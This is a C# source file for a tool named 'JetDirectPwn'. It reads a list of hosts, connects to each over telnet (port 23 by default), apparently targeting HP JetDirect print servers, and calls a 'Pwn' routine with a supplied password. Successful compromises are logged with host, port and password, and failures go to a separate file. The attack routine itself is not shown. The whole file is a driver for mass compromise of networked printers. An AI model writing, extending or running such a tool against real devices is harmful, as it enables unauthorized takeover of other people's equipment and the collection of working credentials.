using System;
using System.IO;

namespace JetDirectPwn
{
    class MainClass
    {
        public static void Main(string[] args)
        {

			StreamReader reader = new StreamReader(args[0]);
			StreamWriter successWriter = new StreamWriter(args[1]);
			StreamWriter failWriter = new StreamWriter(args[2]);

			string passwd = args[3];

            while (reader.BaseStream.Position < reader.BaseStream.Length)
            {
                string[] parts = reader.ReadLine().Split(' ');
                int port = parts.Length == 1 ? 23 : Convert.ToInt32(parts[1]);
                JetDirectConnection conn = new JetDirectConnection(parts[0], port);

                if (conn.Pwn(passwd))
				{
                    successWriter.WriteLine(string.Format("{0} {1} {2}", parts[0], port, passwd));
            		successWriter.Flush();
				}
				else
				{
					failWriter.WriteLine(parts[0]);
					failWriter.Flush();
				}
			}
        }
    }
}
